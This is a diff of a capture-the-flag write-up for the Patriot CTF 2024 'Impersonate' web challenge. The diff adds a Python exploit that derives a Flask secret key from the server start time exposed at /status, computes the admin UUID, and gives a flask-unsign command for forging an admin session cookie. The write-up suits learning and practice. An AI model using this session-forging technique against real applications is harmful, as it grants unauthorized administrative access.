@@ -1,5 +1,7 @@
-# DOGDAYS Patriot CTF 2024
+# Impersonate Patriot CTF 2024
+
 @phulelouch
+
 ### Problem:
 
 ```
@@ -10,13 +12,88 @@ app.secret_key = secure_key
 ```
 
 ### Way of thinking :
-Flask secert key using server_start_time and they also public that info at /status
+
+Flask secert key using server\_start\_time and they also public that info at /status
 
 So we can create our own flask session.
 
-###  Solution:
+### Solution:
 
- I write a code to compute the Flask secret key and admin UID then use flask-unsign. The code in PatriotCTF_Impersonate_exploit.py
+I write a code to compute the Flask secret key and admin UID then use flask-unsign. The code in PatriotCTF\_Impersonate\_exploit.py
 
-![alt text](<Screenshot 2024-09-21 at 8.32.56 PM.png>)
-![alt text](<Screenshot 2024-09-21 at 8.26.15 PM.png>)
+![alt text](<Screenshot 2024-09-21 at 8.32.56 PM.png>) ![alt text](<Screenshot 2024-09-21 at 8.26.15 PM.png>)
+
+```python
+# python3
+import requests
+from datetime import datetime, timedelta
+import hashlib
+import re
+import uuid
+
+BASE_URL = 'http://chal.competitivecyber.club:9999'  
+STATUS_URL = f'{BASE_URL}/status'
+USER_URL = f'{BASE_URL}/user'
+ADMIN_URL = f'{BASE_URL}/admin'
+SECRET_UUID = uuid.UUID('31333337-1337-1337-1337-133713371337')
+
+# Step 1: Retrieve server time and uptime
+def get_server_times():
+    response = requests.get(STATUS_URL)
+    content = response.text
+    uptime_match = re.search(r'Server uptime: ([\d:]+)', content)
+    current_time_match = re.search(r'Server time: ([\d\-: ]+)', content)
+
+    if uptime_match and current_time_match:
+        formatted_uptime = uptime_match.group(1)
+        formatted_current_time = current_time_match.group(1)
+    else:
+        print("[-] Could not parse server time and uptime.")
+        exit(1)
+    uptime_parts = list(map(int, formatted_uptime.split(':')))
+    if len(uptime_parts) == 3:
+        hours, minutes, seconds = uptime_parts
+        uptime = timedelta(hours=hours, minutes=minutes, seconds=seconds)
+    else:
+        print("[-] Unexpected uptime format.")
+        exit(1)
+    try:
+        current_time = datetime.strptime(formatted_current_time, '%Y-%m-%d %H:%M:%S')
+    except ValueError:
+        print("[-] Unexpected current time format.")
+        exit(1)
+
+    return current_time, uptime
+
+# Step 2: Compute secret key
+def compute_secret_key(current_time, uptime):
+    server_start_time = current_time - uptime
+    server_start_str = server_start_time.strftime('%Y%m%d%H%M%S')
+    print(server_start_time)
+    secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
+    print(f"[+] Computed secret key: {secure_key}")
+    return secure_key
+
+# Step 3: Compute admin UID
+def compute_admin_uid():
+    admin_uid = uuid.uuid5(SECRET_UUID, 'administrator')
+    print(f"[+] Computed admin UID: {admin_uid}")
+    return str(admin_uid)
+
+
+def main():
+    print("[*] Starting exploit...")
+    current_time, uptime = get_server_times()
+    print(f"[+] Current Server Time: {current_time}")
+    print(f"[+] Server Uptime: {uptime}")
+
+    secure_key = compute_secret_key(current_time, uptime)
+    admin_uid = compute_admin_uid()
+
+    # Use:
+    # flask-unsign --sign --cookie "{'username': 'administrator', 'uid': '02ec19dc-bb01-5942-a640-7099cda78081', 'is_admin': True}" --secret '0b546e552a18f98e5531bf3cf8f6c37ea405808da178bd429592731cdc2f200b'
+
+
+if __name__ == '__main__':
+    main()
+```
